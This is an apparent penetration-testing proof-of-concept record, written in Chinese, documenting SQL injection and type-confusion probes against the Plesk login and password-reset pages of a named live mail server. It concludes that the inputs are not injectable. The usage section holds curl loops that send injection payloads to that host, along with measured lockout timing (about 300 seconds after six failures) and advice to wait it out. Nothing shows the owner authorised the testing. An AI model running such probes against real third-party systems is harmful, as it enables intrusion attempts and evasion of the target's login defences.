# Plesk Obsidian 18.0.82.2 login_up.php/.php3 与 get_password.php 预认证输入解析层无 SQL 注入/类型混淆（实测封口；IP 聚合登录锁第 6 次量化）

- **code**: plesk-18-0-82-login-input-parsing-negative-lock6
- **kind**: poc
- **category**: sqli
- **component**: Plesk Obsidian 18.0.82.2（sw-cp-server + php-fpm）
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 18:52-19:00 UTC 本机 bash+curl 直连（记录代理），共 12 请求：8443 POST /login_up.php 基线（不存在用户+错口令）与 5 条 login_name 载荷（' OR '1'='1、'--、'、login_name[] 数组、1500+ 超长）全部 HTTP 200 且 status 均为 Incorrect username or password，遮蔽 forgery token/时间戳/回显 login_name 后 norm_sha256 全部相同（a4656090…bec766），无 SQL/PDO/Fatal 错误；/login_up.php3 同凭据同样同构（norm 相同）；443 POST /get_password.php resetBy=login 3 条同族载荷全部 200/374B task not_started（遮蔽 id/updated 后 norm 一致 7ac0974…）；第 6 次连续失败登录触发 Too many login attempts，约 300s 后恢复（与超长值无关）。
- **created_at**: 2026-11-11T19:05:42.265Z
- **engine**: mail.goffsgames.co.uk (88.208.224.249) 443/8443

## 描述

Plesk 18.0.82.2 登录/重置表单是全目标唯一在认证前真正解析并回显语义差异的 handler（XML API 认证门先于 packet 解析），但其 login_name 查询参数进入 handler 前已参数化/归一化：SQL 注入式载荷与类型混淆（数组）均无任何语义差异。附带量化：同一出口连续 5 次失败登录后第 6 次即 IP 聚合锁，约 300s 自动恢复。

## 用法

```
复现（判据=遮蔽动态字段后逐字节同构）：\nUA="$ARTEX_UA"; B=https://mail.goffsgames.co.uk:8443\nloop payloads; do curl -sk -A "$UA" -o r.html -w '%{http_code}|%{size_download}\\n' --data-urlencode "login_name=$payload" --data-urlencode "passwd=WrongPass!A1" --data-urlencode "locale_id=default" "$B/login_up.php"; python3 - -------- <<'PY'  # 遮蔽 [0-9a-f]{32}、ISO 时间、\"values\":{\"login_name\":\"...\"} 后 sha256\nPY\ndone\n# get_password: curl -sk -H 'X-Requested-With: XMLHttpRequest' --data-urlencode 'resetBy=login' --data-urlencode \"login=$payload\" --data-urlencode 'email=' --data-urlencode 'forgery_protection_token=<32hex>' https://mail.goffsgames.co.uk/get_password.php\n# 若出现 Too many login attempts：约 300s 后再试，勿在同一窗口内加码。
```
